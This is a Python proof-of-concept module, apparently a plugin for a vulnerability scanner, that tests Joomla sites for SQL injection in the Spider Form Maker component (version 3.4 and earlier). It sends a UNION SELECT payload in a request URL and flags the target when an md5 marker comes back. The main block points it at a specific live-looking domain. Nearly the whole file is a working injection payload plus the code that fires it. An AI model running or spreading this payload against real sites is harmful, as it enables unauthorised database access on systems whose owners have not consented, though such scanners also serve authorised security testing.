#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Joomla Spider Form Maker <=3.4 SQL
References: http://www.exploit-db.com/exploits/34637/
Author    :  ko0zhi
"""

from ..miniCurl import Curl
from ..t  import T
class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = '/index.php?option=com_formmaker&view=formmaker&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x7165696a71,IFNULL(CAST(md5(3.1415)%20AS%20CHAR),0x20),0x7175647871),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23'
        url = arg + payload
        code, head, res, errcode, _ = curl.curl('"%s"' % url)
        if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
            output(url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_ececaafc7676dac4a46cfecae1fcaf57.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_ececaafc7676dac4a46cfecae1fcaf57.py
#/root/github/poccreate/codesrc/exp-560.py